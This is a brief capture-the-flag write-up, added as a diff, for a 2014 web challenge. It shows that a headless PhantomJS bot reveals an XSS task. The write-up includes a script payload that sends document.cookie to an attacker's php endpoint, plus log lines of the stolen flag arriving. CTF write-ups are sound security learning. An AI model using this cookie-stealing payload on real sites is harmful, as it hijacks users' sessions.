@@ -1,0 +1,18 @@
+Web 300 
+
+fairly easy; first check if the link submitted connects to your server.
+
+--
+173.245.54.59 - - [20/Sep/2014:15:17:38 +0000] "GET /trace.php HTTP/1.1" 200 31 "-" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.0 Safari/534.34"
+--
+
+now from here, you have to understand that if the user-agent of the connection is made by "phantomjs" or "nodejs", it's definitely a xss challenge.
+
+after thinking and trying few tests, I guessed out that the url is the image file, and the string after hashtag can be the description of the file.
+thinking for a couple of seconds, you will realize that description are usually not filtered in a real-life situation and it can be xss'd.
+
+By few trials of inserting a simple xss payload like <script>document.location.href='~~~.php?cookie='+document.cookie;</script>, you will get the flag.
+
+--
+173.245.54.59 - - [20/Sep/2014:15:32:20 +0000] "GET /pwn.php?cookie=win=%22flag%7Bthese_browser_bots_are_annoying%7D%22 HTTP/1.1" 404 134 "http://54.86.199.163:7878/" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.0 Safari/534.34"
+--
